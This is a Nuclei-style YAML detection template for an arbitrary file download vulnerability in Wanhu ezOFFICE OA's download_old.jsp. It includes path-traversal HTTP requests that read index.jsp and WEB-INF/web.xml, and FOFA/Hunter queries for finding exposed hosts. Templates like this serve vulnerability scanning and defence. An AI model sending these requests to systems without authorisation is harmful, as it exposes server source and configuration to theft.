id: wanhu-ezoffice-downloadoldjsp-filedownload
info:
  name: 万户 ezoffice download_old.jsp - filedownload
  author: leadlife
  severity: high
  description: 万户OA download_old.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
  reference: 
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20download_old.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
  metadata:
    veified: true
    max-request: 1
    hunter-query: app.name="万户 Ezoffice OA"
    fofa-query: app="万户网络-ezOFFICE"  
  tags: wanhu,filedownload,oa,ezoffice

http:
  - raw:
      - |
        GET /defaultroot/download_old.jsp?path=..&name=%F0%9F%90%B6&FileName=index.jsp HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /defaultroot/download_old.jsp?path=..&name=%F0%9F%90%B6&FileName=WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}

    
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body_1,"fileNameTemp","HttpServletRequest")'
          - 'contains_all(body_2,"<?xml","display-name")'
        condition: or

      - type: dsl
        dsl: 
          - 'status_code_1 == 200 && status_code_2 == 200'